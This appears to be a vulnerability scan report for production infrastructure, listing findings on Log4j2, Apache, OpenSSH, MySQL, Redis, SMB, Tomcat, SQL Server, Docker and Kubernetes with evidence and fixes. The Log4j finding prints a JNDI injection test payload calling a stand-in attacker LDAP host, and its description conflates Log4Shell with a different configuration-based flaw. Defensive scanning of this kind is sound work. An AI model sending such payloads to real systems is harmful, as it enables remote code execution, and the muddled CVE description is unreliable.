Policy.policyComments: Comprehensive vulnerability assessment for production infrastructure including web servers, databases, and network devices. Includes compliance checks for PCI DSS, SOX, and HIPAA requirements.

ReportItem.pluginName: Apache Log4j2 Remote Code Execution Vulnerability (Log4Shell)
ReportItem.description: Apache Log4j2 versions 2.0-beta9 through 2.14.1 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) are vulnerable to a remote code execution (RCE) attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is known as "Log4Shell" or "LogJam".
ReportItem.solution: Upgrade to Apache Log4j2 version 2.15.0 or later. Alternatively, in releases >=2.10, this behavior can be mitigated by setting system property "log4j2.formatMsgNoLookups" to "true" or by removing the JndiLookup class from the classpath.
ReportItem.synopsis: The remote host is running a version of Apache Log4j2 that is affected by a remote code execution vulnerability.
ReportItem.plugin_output:
Apache Log4j2 version 2.14.1 was detected on the remote host.
The following evidence was found: - HTTP response headers indicate Log4j2 usage - Application logs contain Log4j2 patterns - JAR file analysis confirms vulnerable version
Vulnerable paths detected: /opt/tomcat/webapps/app1/WEB-INF/lib/log4j-core-2.14.1.jar /opt/tomcat/webapps/app2/WEB-INF/lib/log4j-api-2.14.1.jar /usr/share/java/log4j-core-2.14.1.jar
Test payload: ${jndi:ldap://attacker.com/exploit} Response: Connection attempt detected to external LDAP server

ReportItem.description: The version of Apache HTTP Server installed on the remote host is prior to 2.4.56. It is, therefore, affected by multiple vulnerabilities including HTTP request smuggling in mod_proxy_uwsgi and potential information disclosure.
ReportItem.solution: Upgrade to Apache HTTP Server version 2.4.56 or later.
ReportItem.synopsis: The remote Apache HTTP Server is affected by multiple vulnerabilities.
ReportItem.plugin_output:
Apache HTTP Server version 2.4.52 detected.
Server: Apache/2.4.52 (Ubuntu) Configuration issues found: - mod_proxy_uwsgi enabled with default configuration - ServerTokens set to Full (information disclosure) - Directory browsing enabled on /var/www/html/uploads/
Vulnerable modules: - mod_proxy_uwsgi (CVE-2023-25690) - mod_proxy_http (CVE-2023-27522)

ReportItem.description: The version of OpenSSH running on the remote host is affected by a remote code execution vulnerability in ssh-agent forwarding.
ReportItem.solution: Upgrade to OpenSSH version 9.3p2 or later.
ReportItem.synopsis: The remote SSH server is affected by a remote code execution vulnerability.
ReportItem.plugin_output:
OpenSSH version 8.9p1 detected.
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.3
Configuration analysis: - PermitRootLogin: yes (security risk) - PasswordAuthentication: yes (should use key-based auth) - X11Forwarding: yes - AgentForwarding: yes (vulnerable to CVE-2023-38408)
Active connections: 3 Failed login attempts (last 24h): 127

ReportItem.description: MySQL Server versions 8.0.32 and earlier, 5.7.41 and earlier are vulnerable to multiple security issues including privilege escalation, unauthorized data access, and denial of service attacks.
ReportItem.solution: Upgrade to MySQL Server version 8.0.33, 5.7.42, or later. Apply the latest Critical Patch Update from Oracle.
ReportItem.synopsis: The remote MySQL server is affected by multiple critical vulnerabilities.
ReportItem.plugin_output:
MySQL Server version 8.0.28 detected.
Server version: 8.0.28-0ubuntu0.20.04.3
Database analysis: - Root account accessible remotely (HIGH RISK) - Anonymous users present: 2 - Test database exists and is accessible - SSL/TLS not enforced for connections - Binary logging enabled but not encrypted
Vulnerable components: - Server: MySQL Community Server (GPL) 8.0.28 - InnoDB storage engine version 8.0.28 - Performance Schema enabled
Security findings: - 15 users with SUPER privilege - 8 users with FILE privilege - Password validation plugin not enabled - Audit logging disabled
Database sizes: - production_db: 2.3 GB (contains PII) - customer_data: 1.8 GB (contains payment info) - logs_db: 450 MB

ReportItem.description: The Redis server is configured without authentication, allowing unauthorized access to stored data and potential remote code execution through Lua scripting.
ReportItem.solution: Configure Redis authentication using requirepass directive. Disable dangerous commands like FLUSHDB, FLUSHALL, KEYS, CONFIG. Bind Redis to localhost only if external access is not required.
ReportItem.synopsis: The remote Redis server allows unauthorized access.
ReportItem.plugin_output:
Redis server version 6.2.6 detected without authentication.
Server configuration: - Authentication: DISABLED (CRITICAL) - Protected mode: DISABLED - Bind address: 0.0.0.0 (all interfaces) - Port: 6379 (default) - Max clients: 10000
Dangerous commands enabled: - FLUSHDB (can delete databases) - FLUSHALL (can delete all data) - CONFIG (can modify configuration) - EVAL (can execute Lua scripts) - DEBUG (debugging commands)
Data analysis: - Total keys: 15,847 - Memory usage: 234 MB - Connected clients: 12 - Keyspace: db0:keys=15847,expires=3421
Sensitive data detected: - session:* (user sessions) - cache:user_* (user data cache) - queue:payments (payment processing queue)

ReportItem.description: The remote Windows host is affected by multiple vulnerabilities in the SMB protocol implementation that could allow elevation of privilege and remote code execution.
ReportItem.solution: Apply Microsoft Security Update KB5025221 and KB5025229 for Windows Server 2019.
ReportItem.synopsis: The remote Windows host is affected by multiple SMB vulnerabilities.
ReportItem.plugin_output:
Windows Server 2019 Standard (Build 17763.4377) detected.
SMB configuration analysis: - SMBv1: ENABLED (deprecated and insecure) - SMBv2: ENABLED - SMBv3: ENABLED - SMB signing: NOT REQUIRED (security risk) - SMB encryption: DISABLED
Shares discovered: - ADMIN$ (administrative share) - C$ (administrative share) - IPC$ (inter-process communication) - SYSVOL (domain controller share) - NETLOGON (domain controller share) - AppData (custom share - 2.1 GB)
Security findings: - Guest account enabled - Null session enumeration possible - Weak SMB signing configuration - Legacy protocols enabled
Missing patches: - KB5025221 (Critical - SMB vulnerabilities) - KB5025229 (Important - Privilege escalation) - KB5024342 (Important - Windows Common Log File System)
Event log analysis: - Failed logon attempts: 89 (last 24h) - Suspicious PowerShell activity detected - Unusual network connections to external IPs

ReportItem.description: The version of Apache Tomcat running on the remote host is affected by multiple vulnerabilities including information disclosure and denial of service.
ReportItem.solution: Upgrade to Apache Tomcat version 10.1.8, 9.0.74, or 8.5.88.
ReportItem.synopsis: The remote Apache Tomcat server is affected by multiple vulnerabilities.
ReportItem.plugin_output:
Apache Tomcat version 9.0.65 detected.
Server: Apache-Coyote/1.1 Tomcat version: 9.0.65
Web applications deployed: - /manager (Tomcat Manager - HIGH RISK if accessible) - /host-manager (Host Manager) - /examples (Example applications - should be removed) - /docs (Documentation - information disclosure) - /ROOT (Default application) - /myapp (Custom application)
Configuration issues: - Default credentials may be in use - Manager application accessible remotely - Directory listing enabled - Error pages reveal server information - SSL/TLS not properly configured
Security headers missing: - X-Frame-Options - X-Content-Type-Options - X-XSS-Protection - Strict-Transport-Security - Content-Security-Policy
JVM information: - Java version: 11.0.16 - JVM vendor: Eclipse Adoptium - Max heap size: 2048 MB - Current heap usage: 1.2 GB

ReportItem.description: The version of Microsoft SQL Server running on the remote host is affected by multiple vulnerabilities that could allow remote code execution and privilege escalation.
ReportItem.solution: Apply the latest Cumulative Update for SQL Server 2019. Install CU19 or later.
ReportItem.synopsis: The remote SQL Server is affected by multiple vulnerabilities.
ReportItem.plugin_output:
Microsoft SQL Server 2019 (RTM-CU16) detected.
Version: 15.0.4223.1 (needs update to 15.0.4298.1 or later) Edition: Standard Edition (64-bit) Service Pack: None Cumulative Update: CU16 (outdated - CU19+ required)
Instance configuration: - Mixed authentication mode enabled - SA account enabled (security risk) - Remote connections allowed - SQL Server Browser service running - TCP/IP protocol enabled on all IPs
Database analysis: - System databases: 4 - User databases: 12 - Total size: 45.2 GB - Backup encryption: NOT CONFIGURED
Security findings: - 'sa' account not disabled - Weak password policy - Excessive sysadmin privileges (8 accounts) - SQL Server Agent running as LocalSystem - Audit logging not configured - Transparent Data Encryption not enabled
Databases with sensitive data: - CustomerDB (contains PII and payment data) - EmployeeDB (contains HR data) - FinanceDB (contains financial records)
Recent suspicious activity: - Multiple failed login attempts for 'sa' account - Unusual query patterns detected - Large data exports outside business hours

ReportItem.description: Docker Engine versions before 23.0.3 contain multiple critical vulnerabilities that allow container escape, privilege escalation, and arbitrary code execution on the host system.
ReportItem.solution: Upgrade Docker Engine to version 23.0.3 or later. Review container configurations and implement proper security controls.
ReportItem.synopsis: The remote Docker Engine is affected by multiple critical vulnerabilities.
ReportItem.plugin_output:
Docker Engine version 20.10.17 detected (VULNERABLE).
Docker version: 20.10.17, build 100c701 API version: 1.41 Go version: go1.17.11 Git commit: 100c701 Built: Mon Jun 6 23:02:57 2022
Container analysis: - Total containers: 23 (15 running, 8 stopped) - Privileged containers: 3 (HIGH RISK) - Containers with host network: 2 - Containers with host PID namespace: 1 - Root containers: 18 (should use non-root users)
Vulnerable container configurations: - Container 'web-app-1': Running as root with --privileged flag - Container 'db-backup': Mounted /var/run/docker.sock (container escape risk) - Container 'monitoring': Host network mode enabled - Container 'legacy-app': Using outdated base image with known vulnerabilities
Image analysis: - Total images: 45 - Images with HIGH/CRITICAL vulnerabilities: 12 - Outdated base images: 8 - Images without security scanning: 15
Security findings: - Docker daemon running as root - Docker socket exposed without authentication - No resource limits configured on containers - Secrets stored in environment variables - No image signing verification
Recent container activity: - 3 containers created with suspicious configurations - Multiple container escapes attempted (blocked by AppArmor) - Unusual network traffic from containers to external IPs - High CPU usage in container 'crypto-miner' (potential malware)
Kubernetes integration: - kubelet version: v1.24.3 (outdated) - Container runtime: Docker (deprecated in Kubernetes) - Pod security policies: NOT CONFIGURED

ReportItem.description: The Kubernetes API server is affected by multiple vulnerabilities that could allow privilege escalation and unauthorized access to cluster resources.
ReportItem.synopsis: The remote Kubernetes API server is affected by multiple vulnerabilities.
ReportItem.plugin_output:
Kubernetes API server version v1.24.3 detected (VULNERABLE).
Cluster information: - Kubernetes version: v1.24.3 (needs upgrade) - API server: kube-apiserver v1.24.3 - Controller manager: kube-controller-manager v1.24.3 - Scheduler: kube-scheduler v1.24.3 - etcd version: 3.5.3-0
Node analysis: - Total nodes: 5 (3 control plane, 2 worker) - Nodes with outdated kubelet: 5 - Nodes with security issues: 3
Security configuration issues: - Anonymous authentication enabled (--anonymous-auth=true) - Insecure port enabled (--insecure-port=8080) - RBAC not properly configured - Pod Security Standards not enforced - Admission controllers missing: PodSecurityPolicy, SecurityContextDeny
Workload analysis: - Total pods: 67 - Privileged pods: 8 - Pods running as root: 23 - Pods with hostNetwork: 4 - Pods with hostPID: 2
Namespace security: - default namespace in use (security risk) - No network policies configured - Resource quotas not set - Service accounts with excessive permissions: 12
Recent security events: - Unauthorized API access attempts: 45 (last 24h) - Pod creation with privileged escalation - Suspicious kubectl commands executed - External traffic to API server from unknown IPs
